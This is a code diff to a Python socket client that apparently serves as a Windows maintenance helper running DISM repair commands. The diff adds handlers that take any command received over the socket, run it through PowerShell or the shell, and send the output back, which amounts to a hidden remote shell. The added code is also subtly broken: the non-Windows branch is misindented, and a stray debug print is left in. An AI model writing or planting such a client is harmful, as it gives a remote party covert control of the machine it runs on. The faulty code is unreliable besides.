@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 from threading import Thread
 
 def handle_command(command_data):
@@ -18,14 +19,25 @@ def handle_command(command_data):
         subprocess.run(["DISM", "/Online", "/Cleanup-Image", "/CheckHealth"])
         subprocess.run(["DISM", "/Online", "/Cleanup-Image", "/ScanHealth"])
         subprocess.run(["DISM", "/Online", "/Cleanup-Image", "/RestoreHealth"])
-    elif command.startswith("powershell:"):
-        powershell_command = command.split(":", 1)[1]
-        try:
-            output = subprocess.check_output(["powershell", "-Command", powershell_command], shell=True)
-            client_socket.sendall(output)
-        except subprocess.CalledProcessError as e:
-            error_msg = str(e).encode('utf-8')
-            client_socket.sendall(error_msg)
+    elif command.startswith("os:"):
+        os_command = command.split(":", 1)[1]
+        if os.name == 'nt':  # Check if the OS is Windows
+            try:
+                output = subprocess.check_output(["powershell", "-Command", os_command], shell=True, stderr=subprocess.STDOUT)
+                client_socket.sendall(output)
+            except subprocess.CalledProcessError as e:
+                error_msg = str(e).encode('utf-8')
+                client_socket.sendall(error_msg)
+            else:
+                try:
+                    output = subprocess.check_output(os_command, shell=True, stderr=subprocess.STDOUT)
+                    client_socket.sendall(output)
+                except subprocess.CalledProcessError as e:
+                    error_msg = str(e).encode('utf-8')
+                    client_socket.sendall(error_msg)
+
+
+
 
 
 def listen_for_commands():
@@ -33,10 +45,24 @@ def listen_for_commands():
         try:
             command_data = client_socket.recv(1024).decode('utf-8')
             if command_data:
-                handle_command(command_data)
+                print(f"Received command: {command_data}")
+                execute_command(command_data)
         except Exception as e:
             print(f"Error receiving command: {e}")
             break
+
+def execute_command(command_data):
+    try:
+        if command_data.startswith("os:"):
+            os_command = command_data.split(":", 1)[1]
+            output = subprocess.check_output(["powershell", "-Command", os_command], shell=True, stderr=subprocess.STDOUT)
+            print(output.decode('utf-8'))
+            client_socket.sendall(output)
+        else:
+            print("naaaaa")
+    except Exception as e:
+        print(f"Error executing command: {e}")
+
 
 def main():
     global client_socket
@@ -57,3 +83,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
